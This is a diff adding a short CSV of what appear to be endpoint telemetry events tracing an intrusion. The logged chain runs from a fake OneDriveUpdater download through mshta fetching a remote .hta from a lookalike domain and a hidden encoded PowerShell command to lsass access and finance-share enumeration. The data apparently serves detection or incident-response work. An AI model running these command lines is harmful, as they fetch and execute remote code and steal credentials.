@@ -1,0 +1,7 @@
+UtcTime,EventID,Image,ParentImage,CommandLine,User,Hashes,DestinationIp,DestinationHostname
+2026-02-13 08:41:05.112,1,C:\Users\mreyes\AppData\Local\Temp\OneDriveUpdater.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,"OneDriveUpdater.exe /silent",OBSIDIAN\mreyes,SHA256=9c7a...,,
+2026-02-13 08:42:10.004,1,C:\Windows\System32\mshta.exe,C:\Users\mreyes\AppData\Local\Temp\OneDriveUpdater.exe,"mshta.exe hxxp://cdn-msauth-storage.com/update.hta",OBSIDIAN\mreyes,,185.225.17.44,cdn-msauth-storage.com
+2026-02-13 08:42:11.220,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\mshta.exe,"powershell -nop -w hidden -enc SQBFAFg...",OBSIDIAN\mreyes,,,
+2026-02-13 08:42:12.102,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,C:\Users\mreyes\AppData\Roaming\mscache\msvcp140.dll,OBSIDIAN\mreyes,,,
+2026-02-13 08:49:55.781,10,C:\Windows\System32\rundll32.exe,,lsass.exe,OBSIDIAN\mreyes,,,
+2026-02-13 09:03:42.031,3,C:\Windows\System32\cmd.exe,,cmd /c dir \\FILESRV02\finance$,OBSIDIAN\mreyes,,10.20.2.22,FILESRV02
